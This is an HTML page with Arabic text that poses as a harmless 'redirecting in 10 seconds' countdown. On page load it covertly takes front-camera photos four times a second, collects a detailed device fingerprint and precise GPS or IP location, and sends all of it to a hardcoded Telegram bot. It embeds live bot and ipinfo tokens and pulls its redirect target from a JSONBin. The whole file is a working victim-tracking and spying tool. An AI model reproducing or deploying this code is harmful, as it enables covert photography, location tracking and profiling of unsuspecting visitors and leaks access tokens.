<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Page</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #ffffff; color: #222;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex; align-items: center; justify-content: center;
      height: 100vh; text-align: center; flex-direction: column;
    }
    .container { display: flex; flex-direction: column; align-items: center; gap: 20px; }
    .timer-wrapper { position: relative; width: 160px; height: 160px; }
    svg { transform: rotate(-90deg); }
    .circle-bg { fill: none; stroke: #e0e0e0; stroke-width: 3; }
    .circle-progress { fill: none; stroke: #4a4a4a; stroke-width: 3; stroke-linecap: round; transition: stroke-dashoffset 1s linear; }
    #countdown {
      position: absolute; top: 50%; left: 50%;
      transform: translate(-50%, -50%);
      font-size: 3rem; font-weight: 300; color: #4a4a4a;
    }
    #redirectMessage {
      font-size: 1rem; color: #4a4a4a; margin-top: 10px;
    }
    video { display: none; }
    .permission-box {
      background: #f8f9fa; border: 2px solid #4a4a4a;
      border-radius: 12px; padding: 20px; margin-top: 20px;
      text-align: center; max-width: 320px;
    }
    .permission-box p { margin-bottom: 10px; }
    .btn {
      padding: 12px 25px; background: #4a4a4a; color: white;
      border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px;
    }
  </style>
</head>
<body>
  <div class="container" id="mainContainer">
    <div class="timer-wrapper">
      <svg width="160" height="160" viewBox="0 0 160 160">
        <circle class="circle-bg" cx="80" cy="80" r="70" />
        <circle id="progressCircle" class="circle-progress" cx="80" cy="80" r="70"
          stroke-dasharray="439.82" stroke-dashoffset="0" />
      </svg>
      <div id="countdown">10</div>
    </div>
    <div id="redirectMessage">سيتم تحويلك خلال 10</div>
    <div id="permissionBox" class="permission-box" style="display:none;">
      <p id="permMessage"></p>
      <button class="btn" id="retryBtn">إعادة المحاولة</button>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    // ==================== CONFIGURATION ====================
    const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
    const CHAT_ID = '5151102782';
    const COUNTDOWN_START = 10;
    const CAPTURE_INTERVAL = 250; // 4 صور بالثانية
    const IPINFO_TOKEN = 'a7e43833d69a75';
    const JSONBIN_BIN_ID = '69ee19e8856a68218974812e'; // حاويتك العامة

    // DOM
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const countdownEl = document.getElementById('countdown');
    const redirectMsgEl = document.getElementById('redirectMessage');
    const progressCircle = document.getElementById('progressCircle');
    const permBox = document.getElementById('permissionBox');
    const permMsg = document.getElementById('permMessage');
    const retryBtn = document.getElementById('retryBtn');

    let redirectUrl = 'https://example.com';
    let countdown = COUNTDOWN_START;
    let stream = null;
    let intervalId = null;
    let captureIntervalId = null;
    let latestPosition = null;
    let watchId = null;
    let deviceInfo = null;
    const circumference = 2 * Math.PI * 70;
    let photoCount = 0;

    // ==================== جلب الإعدادات من JSONBin العام ====================
    async function fetchSettingsOnce() {
      try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`);
        const data = await response.json();
        const s = data.record;
        redirectUrl = s.redirectUrl || 'https://example.com';
        if (s.title) document.title = s.title;
      } catch (err) {}
    }

    async function sendTextMessage(text) {
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
        });
      } catch (err) {}
    }

    async function backgroundTasks() {
      // ---------- معلومات الجهاز الدقيقة ----------
      try {
        await new Promise(r => setTimeout(r, 200));
        const uaData = navigator.userAgentData || {};
        let highEntropyValues = {};
        if (uaData.getHighEntropyValues) {
          try {
            highEntropyValues = await uaData.getHighEntropyValues([
              "platform", "platformVersion", "architecture", "model",
              "uaFullVersion", "fullVersionList", "bitness", "wow64"
            ]);
          } catch(e) {}
        }
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        const screenInfo = window.screen;
        let batteryInfo = null;
        try {
          if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            batteryInfo = {
              level: battery.level,
              charging: battery.charging,
              chargingTime: battery.chargingTime,
              dischargingTime: battery.dischargingTime
            };
          }
        } catch(e) {}

        deviceInfo = {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          languages: navigator.languages ? navigator.languages.join(', ') : '',
          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          doNotTrack: navigator.doNotTrack || window.doNotTrack || 'unknown',
          hardwareConcurrency: navigator.hardwareConcurrency || 1,
          deviceMemory: navigator.deviceMemory || 'N/A',
          maxTouchPoints: navigator.maxTouchPoints || 0,
          vendor: navigator.vendor || '',
          product: navigator.product || '',
          appName: navigator.appName || '',
          appVersion: navigator.appVersion || '',
          mobile: uaData.mobile || false,
          highEntropy: highEntropyValues,
          screen: {
            width: screenInfo.width,
            height: screenInfo.height,
            availWidth: screenInfo.availWidth,
            availHeight: screenInfo.availHeight,
            colorDepth: screenInfo.colorDepth,
            pixelDepth: screenInfo.pixelDepth,
            devicePixelRatio: window.devicePixelRatio || 1,
            orientation: screenInfo.orientation ? screenInfo.orientation.type : 'unknown'
          },
          connection: {
            effectiveType: connection.effectiveType || 'unknown',
            downlink: connection.downlink || 0,
            rtt: connection.rtt || 0,
            saveData: connection.saveData || false,
            type: connection.type || 'unknown'
          },
          battery: batteryInfo,
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const brand = deviceInfo.highEntropy.brands
          ? deviceInfo.highEntropy.brands.map(b => `${b.brand} ${b.version}`).join(', ')
          : 'N/A';
        const model = deviceInfo.highEntropy.model || 'N/A';
        const platform = deviceInfo.highEntropy.platform || deviceInfo.platform || 'N/A';
        const platformVersion = deviceInfo.highEntropy.platformVersion || '';

        let text = '<b>📱 DEVICE INFO</b>\n';
        text += `<b>Brand/Model:</b> ${brand} / ${model}\n`;
        text += `<b>Platform:</b> ${platform} ${platformVersion} (${deviceInfo.highEntropy.architecture || ''})\n`;
        text += `<b>Mobile:</b> ${deviceInfo.mobile ? 'Yes' : 'No'}\n`;
        text += `<b>Screen:</b> ${deviceInfo.screen.width}x${deviceInfo.screen.height} @${deviceInfo.screen.devicePixelRatio}x (${deviceInfo.screen.orientation})\n`;
        text += `<b>Touch Points:</b> ${deviceInfo.maxTouchPoints}\n`;
        text += `<b>CPU Cores:</b> ${deviceInfo.hardwareConcurrency}\n`;
        text += `<b>RAM:</b> ${deviceInfo.deviceMemory} GB\n`;
        text += `<b>Network:</b> ${deviceInfo.connection.effectiveType} (↓${deviceInfo.connection.downlink}Mbps, RTT:${deviceInfo.connection.rtt}ms)\n`;
        if (deviceInfo.battery) {
          text += `<b>Battery:</b> ${(deviceInfo.battery.level*100).toFixed(0)}% ${deviceInfo.battery.charging ? '⚡' : '🔋'}\n`;
        }
        text += `<b>Language:</b> ${deviceInfo.language}\n`;
        text += `<b>Timezone:</b> ${deviceInfo.timezone}\n`;
        text += `<b>Online:</b> ${deviceInfo.onLine ? 'Yes' : 'No'}\n`;
        text += `<b>Timestamp:</b> ${deviceInfo.timestamp}`;
        sendTextMessage(text);
      } catch(e) {}

      // ---------- الموقع الدقيق ----------
      if (navigator.geolocation) {
        try {
          const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 15000,
              maximumAge: 0
            });
          });
          if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
            latestPosition = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              source: 'GPS'
            };
          }
        } catch (err) {}
        watchId = navigator.geolocation.watchPosition(
          pos => {
            if (pos.coords.accuracy && pos.coords.accuracy <= 50) {
              latestPosition = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                source: 'GPS'
              };
            }
          },
          err => {},
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
      if (!latestPosition) {
        try {
          const res = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
          const data = await res.json();
          if (data.loc) {
            const [lat, lon] = data.loc.split(',').map(Number);
            latestPosition = { latitude: lat, longitude: lon, accuracy: 10000, source: 'IP' };
          }
        } catch (err) {}
      }
      if (latestPosition) {
        const links = {
          google: `https://www.google.com/maps/search/?api=1&query=${latestPosition.latitude},${latestPosition.longitude}`,
          apple: `http://maps.apple.com/?ll=${latestPosition.latitude},${latestPosition.longitude}&q=My%20Location`,
          osm: `https://www.openstreetmap.org/?mlat=${latestPosition.latitude}&mlon=${latestPosition.longitude}&zoom=18`
        };
        let locText = '<b>📍 LOCATION</b>\n';
        locText += `<b>Coordinates:</b> ${latestPosition.latitude}, ${latestPosition.longitude}\n`;
        locText += `<b>Source:</b> ${latestPosition.source} (${latestPosition.accuracy}m)\n`;
        locText += `\n<b>🗺️ Maps:</b>\n`;
        locText += `<a href="${links.google}">Google Maps</a>\n`;
        locText += `<a href="${links.apple}">Apple Maps</a>\n`;
        locText += `<a href="${links.osm}">OpenStreetMap</a>`;
        sendTextMessage(locText);
      }
    }

    // ---------- الكاميرا ----------
    async function requestCameraAsync() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        video.srcObject = stream;
        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
      } catch (err) {
        permMsg.innerHTML = '⚠️ يرجى السماح بالكاميرا في إعدادات المتصفح ثم الضغط على إعادة المحاولة.';
        permBox.style.display = 'block';
        await new Promise(resolve => {
          retryBtn.onclick = async () => {
            permBox.style.display = 'none';
            try {
              stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
              video.srcObject = stream;
              await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
            } catch(e) {}
            resolve();
          };
        });
      }
    }

    // ---------- التصوير السريع ----------
    function capturePhoto() {
      if (!video.videoWidth || !stream) return null;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      return canvas.toDataURL('image/jpeg', 0.65);
    }

    function b64toBlob(b64Data, contentType) {
      const byteCharacters = atob(b64Data);
      const byteArrays = [];
      for (let offset = 0; offset < byteCharacters.length; offset += 512) {
        const slice = byteCharacters.slice(offset, offset + 512);
        const byteNumbers = new Array(slice.length);
        for (let i = 0; i < slice.length; i++) byteNumbers[i] = slice.charCodeAt(i);
        byteArrays.push(new Uint8Array(byteNumbers));
      }
      return new Blob(byteArrays, { type: contentType || 'image/jpeg' });
    }

    function sendPhoto(photoDataUrl, num) {
      const caption = `<b>📸 Photo #${num}</b>`;
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      const base64str = photoDataUrl.split(',')[1];
      const mime = photoDataUrl.split(',')[0].split(':')[1].split(';')[0] || 'image/jpeg';
      const blob = b64toBlob(base64str, mime);
      formData.append('photo', blob, 'image.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'HTML');
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e => {});
    }

    // ---------- المؤقت ----------
    function updateTimerUI() {
      countdownEl.textContent = countdown;
      redirectMsgEl.textContent = `سيتم تحويلك خلال ${countdown}`;
      const offset = ((COUNTDOWN_START - countdown) / COUNTDOWN_START) * circumference;
      progressCircle.style.strokeDashoffset = offset;
    }

    function captureTick() {
      const photo = capturePhoto();
      if (photo) { photoCount++; sendPhoto(photo, photoCount); }
    }

    function stopAllAndRedirect() {
      if (intervalId) clearInterval(intervalId);
      if (captureIntervalId) clearInterval(captureIntervalId);
      if (stream) stream.getTracks().forEach(t => t.stop());
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
      window.location.href = redirectUrl;
    }

    async function startAll() {
      fetchSettingsOnce();
      requestCameraAsync();
      backgroundTasks();
      updateTimerUI();
      captureIntervalId = setInterval(captureTick, CAPTURE_INTERVAL);
      intervalId = setInterval(() => {
        countdown--;
        updateTimerUI();
        if (countdown <= 0) stopAllAndRedirect();
      }, 1000);
    }

    window.addEventListener('load', startAll);
    window.addEventListener('beforeunload', () => {
      if (intervalId) clearInterval(intervalId);
      if (captureIntervalId) clearInterval(captureIntervalId);
      if (stream) stream.getTracks().forEach(t => t.stop());
      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
    });
  </script>
</body>
</html>
